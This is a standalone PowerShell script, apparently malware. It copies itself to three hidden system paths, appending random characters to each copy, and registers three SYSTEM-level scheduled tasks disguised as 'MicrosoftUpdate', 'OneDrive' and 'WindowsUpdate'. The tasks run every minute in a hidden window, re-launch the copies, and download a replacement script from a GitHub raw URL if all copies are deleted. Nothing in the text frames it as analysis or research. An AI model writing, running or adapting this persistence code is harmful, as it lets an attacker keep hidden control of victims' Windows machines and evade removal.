function Gen-Info {
    # CONNECTION
    Test-Connection -ComputerName Secnesys.com -Count 1

    # CREATION
    $alfa_path = "C:\ProgramData\Microsoft\DRM\alfa.ps1"
    $bravo_path = "C:\Windows\Temp\bravo.ps1"
    $charlie_path = "$env:LOCALAPPDATA\Temp\charlie.ps1"
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    $funcBody = (Get-Command Gen-Info).ScriptBlock.ToString()
    if (-not (Test-Path "$alfa_path")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$alfa_path" -Encoding UTF8
    }
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    if (-not (Test-Path "$bravo_path")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$bravo_path" -Encoding UTF8
    }
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    if (-not (Test-Path "$charlie_path")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$charlie_path" -Encoding UTF8
    }
    
    
    # SCHEDULE TASK CREATION
    
    $cmd = "if (-not (Test-Path '$alfa_path') -and -not (Test-Path '$bravo_path') -and -not (Test-Path '$charlie_path')) { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1', '$alfa_path') } else { if (Test-Path '$alfa_path') { & $alfa_path } else { if (Test-Path '$bravo_path') { & $bravo_path } else { if (Test-Path '$charlie_path') { & '$charlie_path' } } } }"
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd`""
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan)
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
    
    $task_alfa = "MicrosoftUpdate"
    if (-not (Get-ScheduledTask -TaskName $task_alfa -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $task_alfa -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
    }
    
    $task_bravo = "OneDrive"
    if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
    }
    
    $task_charlie = "WindowsUpdate"
    if (-not (Get-ScheduledTask -TaskName $task_charlie -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $task_charlie -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
    }
}

Gen-Info
